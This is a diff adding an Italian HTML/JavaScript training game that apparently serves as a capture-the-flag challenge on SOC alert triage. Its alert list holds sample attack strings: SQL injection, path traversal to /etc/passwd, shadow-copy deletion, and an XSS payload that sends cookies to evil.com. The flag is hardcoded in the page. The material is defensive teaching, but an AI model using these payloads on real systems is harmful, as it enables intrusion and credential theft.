@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SOC Triage Speedrun</title>
+    <style>
+        :root {
+            --bg-color: #0f172a; /* Slate 900 */
+            --card-bg: #1e293b; /* Slate 800 */
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent: #38bdf8;
+            --danger: #ef4444;
+            --safe: #10b981;
+        }
+
+        * {
+            box-sizing: border-box;
+            user-select: none; /* Previene la selezione del testo da smartphone */
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        header {
+            padding: 15px 20px;
+            background-color: #0b1120;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--card-bg);
+        }
+
+        .stats {
+            font-size: 1.2rem;
+            font-weight: bold;
+            font-family: monospace;
+            color: var(--accent);
+        }
+
+        .timer-warning {
+            color: var(--danger);
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .screen {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .screen.active {
+            display: flex;
+            flex-direction: column;
+        }
+
+        h1 { margin-top: 0; color: var(--accent); }
+        p { color: var(--text-muted); line-height: 1.5; }
+
+        /* Stile Card Alert */
+        .alert-card {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: left;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+            border-left: 4px solid var(--accent);
+        }
+
+        .alert-category {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--accent);
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .alert-detail {
+            font-family: "Courier New", Courier, monospace;
+            font-size: 1.1rem;
+            background-color: #000;
+            padding: 10px;
+            border-radius: 6px;
+            word-wrap: break-word;
+            margin-bottom: 10px;
+            color: #34d399;
+        }
+
+        .alert-context {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+
+        /* Pulsanti */
+        .controls {
+            display: flex;
+            gap: 15px;
+            width: 100%;
+        }
+
+        button {
+            flex: 1;
+            padding: 20px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: transform 0.1s;
+        }
+
+        button:active { transform: scale(0.95); }
+
+        .btn-block {
+            background-color: var(--danger);
+            color: white;
+        }
+
+        .btn-ignore {
+            background-color: var(--card-bg);
+            color: var(--safe);
+            border: 2px solid var(--safe);
+        }
+
+        .btn-start {
+            background-color: var(--accent);
+            color: #000;
+            margin-top: 20px;
+        }
+
+        .flag-box {
+            background-color: #064e3b;
+            border: 1px dashed #34d399;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 1.2rem;
+            color: #34d399;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="stats" id="counterUI">0 / 20</div>
+        <div class="stats" id="timerUI">01:00</div>
+    </header>
+
+    <main>
+        <!-- Schermata Iniziale -->
+        <div id="startScreen" class="screen active">
+            <h1>SOC Analyst: Turno di Notte</h1>
+            <p>Sei l'analista di I livello. Hai <strong>60 secondi</strong> per analizzare <strong>20 alert</strong>.</p>
+            <p>Scegli <strong>BLOCCA</strong> se è un attacco reale (True Positive).</p>
+            <p>Scegli <strong>IGNORA</strong> se è traffico legittimo o un test (False Positive).</p>
+            <p>Attento ai tranelli (sviluppatori che testano, scanner interni). Se raggiungi l'80% di precisione, otterrai la FLAG.</p>
+            <button class="btn-start" onclick="startGame()">Inizia Turno</button>
+        </div>
+
+        <!-- Schermata Gioco -->
+        <div id="gameScreen" class="screen">
+            <div class="alert-card">
+                <span class="alert-category" id="alertCategory">EDR ALERT</span>
+                <div class="alert-detail" id="alertDetail">powershell.exe -ep bypass...</div>
+                <div class="alert-context" id="alertContext">Source: 10.0.0.5 (Endpoint)</div>
+            </div>
+            <div class="controls">
+                <button class="btn-ignore" onclick="handleAction(false)">Ignora<br><span style="font-size: 0.8rem">(Sicuro)</span></button>
+                <button class="btn-block" onclick="handleAction(true)">Blocca<br><span style="font-size: 0.8rem">(Minaccia)</span></button>
+            </div>
+        </div>
+
+        <!-- Schermata Finale -->
+        <div id="endScreen" class="screen">
+            <h1 id="endTitle">Turno Concluso!</h1>
+            <p id="endMessage">Analisi completata.</p>
+            <h2 style="font-size: 3rem; margin: 10px 0;" id="scoreUI">0/20</h2>
+            <div id="flagContainer" style="display: none;">
+                <p>Ottimo lavoro, Senior Analyst. Ecco la tua ricompensa:</p>
+                <div class="flag-box">FLAG{Triage_M4st3r_2024}</div>
+            </div>
+            <button class="btn-start" onclick="location.reload()">Riprova</button>
+        </div>
+    </main>
+
+    <script>
+        // Database degli Alert (20 eventi con tranelli)
+        const allAlerts = [
+            // --- TRUE POSITIVES (Da Bloccare) ---
+            { cat: "WAF: SQL INJECTION", detail: "/login.php?user=admin' OR 1=1--", ctx: "IP Pubblico Sconosciuto", malicious: true },
+            { cat: "EDR: POWERSHELL", detail: "powershell.exe -enc JABzAD0ATgB...", ctx: "Comando offuscato in esecuzione", malicious: true },
+            { cat: "IDENTITY: IMPOSSIBLE TRAVEL", detail: "Login success: admin", ctx: "IP: 195.12.3.4 (Russia) - Ultimo login: Italia (5 min fa)", malicious: true },
+            { cat: "EMAIL: MALWARE", detail: "Oggetto: 'Fattura_003.pdf.exe'", ctx: "Mittente: admin@aziedna.it (Dominio falsificato)", malicious: true },
+            { cat: "WAF: PATH TRAVERSAL", detail: "GET /index.php?page=../../../../etc/passwd", ctx: "IP: 45.33.2.1", malicious: true },
+            { cat: "EDR: RANSOMWARE BEHAVIOR", detail: "vssadmin.exe delete shadows /all /quiet", ctx: "Processo su Server DB", malicious: true },
+            { cat: "PROXY: C2 BEACONING", detail: "Connessione TCP a 198.51.100.3:4444", ctx: "IP Non categorizzato (Threat Intel: High)", malicious: true },
+            { cat: "NETWORK: LATERAL MOVEMENT", detail: "SMB Auth Success (Admin)", ctx: "Source: PC-Stagista -> Dest: DomainController", malicious: true },
+            { cat: "WAF: XSS EXPLOIT", detail: "User-Agent: <script>fetch('http://evil.com/'+document.cookie)</script>", ctx: "Traffico in ingresso", malicious: true },
+            { cat: "IDENTITY: BRUTE FORCE", detail: "50 Login Falliti in 1 min, seguito da 1 Successo", ctx: "Utente: ceo_account", malicious: true },
+            
+            // --- FALSE POSITIVES (Da Ignorare - Tranelli) ---
+            { cat: "IDENTITY: LOGIN FALLITO", detail: "3 Login Falliti", ctx: "Utente: s.verdi - IP Interno (Probabile Errore Battitura)", malicious: false },
+            { cat: "WAF: VULNERABILITY SCAN", detail: "GET /admin/test_vuln_scan.php", ctx: "Source IP: 10.1.1.25 (IP Qualys Scanner Autorizzato)", malicious: false },
+            { cat: "EDR: PROCESSO SOSPETTO", detail: "C:\\Windows\\System32\\taskmgr.exe", ctx: "L'utente ha aperto il Task Manager", malicious: false },
+            { cat: "PROXY: CONNESSIONE ESTERNA", detail: "HTTPS GET https://github.com/microsoft", ctx: "Utente: dev_team (Traffico Sviluppatori Normale)", malicious: false },
+            { cat: "NETWORK: DNS TRAFFIC", detail: "UDP Port 53 Request", ctx: "Destinazione: 8.8.8.8 (Google DNS)", malicious: false },
+            { cat: "WAF: XSS BLOCKED", detail: "Payload: <script>alert('test')</script>", ctx: "Source IP: 192.168.1.100 (Subnet Dev) - User-Agent: Postman", malicious: false }, // Tranello! È un test di un dev
+            { cat: "IDENTITY: LOCAL SERVICE", detail: "Login Success: NT AUTHORITY\\SYSTEM", ctx: "Localhost (Avvio servizio di sistema)", malicious: false },
+            { cat: "EDR: CMD EXECUTION", detail: "ping.exe 8.8.8.8", ctx: "Eseguito da IT_Admin per troubleshooting", malicious: false },
+            { cat: "EMAIL: MASS MAILING", detail: "Oggetto: 'Nuove policy ferie aziendali'", ctx: "Mittente: hr@tuazienda.it a All_Staff", malicious: false },
+            { cat: "PROXY: DOWNLOAD ESEGUIBILE", detail: "Download: windows10_update.exe", ctx: "Destinazione: update.microsoft.com", malicious: false }
+        ];
+
+        let alerts = [];
+        let currentIndex = 0;
+        let score = 0;
+        let timeLeft = 60;
+        let timerInterval;
+
+        // Funzione per mescolare l'array (Algoritmo Fisher-Yates)
+        function shuffle(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+            return array;
+        }
+
+        function startGame() {
+            alerts = shuffle([...allAlerts]); // Clona e mescola
+            currentIndex = 0;
+            score = 0;
+            timeLeft = 60;
+            
+            document.getElementById('startScreen').classList.remove('active');
+            document.getElementById('gameScreen').classList.add('active');
+            
+            updateUI();
+            renderCard();
+
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                updateUI();
+                
+                if (timeLeft <= 10) {
+                    document.getElementById('timerUI').classList.add('timer-warning');
+                }
+
+                if (timeLeft <= 0) {
+                    endGame("Tempo Scaduto!");
+                }
+            }, 1000);
+        }
+
+        function updateUI() {
+            document.getElementById('counterUI').innerText = `${currentIndex} / 20`;
+            // Formattazione MM:SS
+            let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+            let s = (timeLeft % 60).toString().padStart(2, '0');
+            document.getElementById('timerUI').innerText = `${m}:${s}`;
+        }
+
+        function renderCard() {
+            if (currentIndex >= alerts.length) {
+                endGame("Triage Completato!");
+                return;
+            }
+            const alert = alerts[currentIndex];
+            document.getElementById('alertCategory').innerText = alert.cat;
+            document.getElementById('alertDetail').innerText = alert.detail;
+            document.getElementById('alertContext').innerText = alert.ctx;
+            updateUI();
+        }
+
+        function handleAction(isBlockAction) {
+            const alert = alerts[currentIndex];
+            
+            // Se l'azione (Blocca = true) coincide con la natura malevola dell'alert
+            if (isBlockAction === alert.malicious) {
+                score++;
+            }
+            
+            currentIndex++;
+            renderCard();
+        }
+
+        function endGame(reason) {
+            clearInterval(timerInterval);
+            document.getElementById('gameScreen').classList.remove('active');
+            document.getElementById('endScreen').classList.add('active');
+            
+            document.getElementById('endTitle').innerText = reason;
+            document.getElementById('scoreUI').innerText = `${score}/20`;
+
+            // Soglia di vittoria: 16 su 20 (80%)
+            if (score >= 16) {
+                document.getElementById('endMessage').innerText = "Eccellente! Hai protetto l'azienda e ignorato il rumore di fondo.";
+                document.getElementById('endMessage').style.color = "var(--safe)";
+                document.getElementById('flagContainer').style.display = "block";
+            } else {
+                document.getElementById('endMessage').innerText = "Troppi errori. O hai bloccato il lavoro dei colleghi o hai fatto entrare gli hacker. L'azienda ti ha licenziato.";
+                document.getElementById('endMessage').style.color = "var(--danger)";
+            }
+        }
+    </script>
+</body>
+</html>
